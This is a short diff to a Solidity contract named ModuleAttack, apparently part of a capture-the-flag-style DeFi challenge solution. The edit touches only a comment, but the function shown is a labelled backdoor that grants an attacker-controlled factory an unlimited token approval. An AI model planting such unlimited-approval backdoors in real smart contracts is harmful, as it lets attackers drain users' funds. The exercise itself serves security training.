@@ -12,7 +12,7 @@ import "hardhat/console.sol";
 
 contract ModuleAttack {
     function openSesame(address tokenAddress, address gnosisSafeFactoryAttack) external {
-        // Backdoor
+        // Backdoor (there is no DVT in the proxy yet)
         IERC20(tokenAddress).approve(gnosisSafeFactoryAttack, type(uint256).max);
     }
 }
